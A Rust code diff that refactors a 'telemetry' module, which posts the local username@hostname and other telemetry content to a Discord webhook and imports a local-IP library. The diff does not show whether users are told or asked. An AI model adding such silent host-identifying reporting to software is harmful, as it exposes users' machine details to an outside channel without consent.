@@ -1,35 +1,41 @@
 use std::io::Read;
-
 use reqwest;
-use serde::Serialize;
 use local_ip_address::local_ip;
 use whoami;
 use regex::Regex;
-
-#[derive(Debug, Default, Serialize)]
-struct HookMessage {
-    username: String,
-    avatar_url: String,
-    content: String
-}
-impl HookMessage {
-    fn new_with_system_username(avatar_url: String, content: String) -> Self {
-        HookMessage { username: format!("{}@{}", whoami::username(), whoami::hostname()), avatar_url, content }
-    }
-}
+use serde_json::json;
 
 
 #[derive(Default, Debug)]
 pub struct DiscordWebHook {
-    pub url: String
+    pub url: String,
+    pub username: String,
+    pub avatar_url: String
 }
 
 impl DiscordWebHook {
-    fn send(self, message: HookMessage) -> Result<u64, ()> {
+    pub fn new(url: &str) -> Self {
+        DiscordWebHook { url: url.to_owned(), username: format!("{}@{}", whoami::username(), whoami::hostname()), avatar_url: "https://l.ig4er.link/rqds-i".to_owned() }
+    }
+
+    pub fn new_with_username(url: &str, usermane: &str) -> Self {
+        DiscordWebHook { url: url.to_owned(), username: usermane.to_owned(), avatar_url: "https://l.ig4er.link/rqds-i".to_owned() }
+    }
+
+    pub fn new_with_avatar(url: &str, usermane: &str, avatar_url: &str) -> Self {
+        DiscordWebHook { url: url.to_owned(), username: usermane.to_owned(), avatar_url: avatar_url.to_owned() }
+    }
+
+    fn send(self, message: String) -> Result<u64, ()> {
         let client = reqwest::blocking::Client::new();
         if let Ok(res) = client.post(self.url)
         .header("Content-Type", "application/json")
-        .body(serde_json::to_string(&message).unwrap()).send() {
+        .body(json!({
+            "username": self.username,
+            "avatar_url": self.avatar_url,
+            "content": message
+        }).to_string())
+        .send() {
             return Ok(res.content_length().unwrap());
         };
         Err(())
@@ -40,19 +46,16 @@ impl DiscordWebHook {
 pub struct Telemetry {
     pub hook: DiscordWebHook,
     pub app_name: String,
-    pub image_url: String
 }
 
 impl Telemetry {
-    pub fn new(hook: DiscordWebHook, app_name: &str, image_url: Option<&str>) -> Self {
-        let image_url = image_url.unwrap_or("https://l.ig4er.link/rqds-i").to_owned();
-
-        Telemetry{ hook: hook, app_name: app_name.to_owned(), image_url: image_url }
+    pub fn new(hook: DiscordWebHook, app_name: &str) -> Self {
+        Telemetry{ hook: hook, app_name: app_name.to_owned() }
     }
 
     pub fn greet(self) -> Result<(), ()> {
+        let message = self.get_telemetry_content();
 
-        let message = HookMessage::new_with_system_username(self.image_url.to_owned(), self.get_telemetry_content());
         if let Ok(_) = self.hook.send(message) {
             return Ok(());
         };
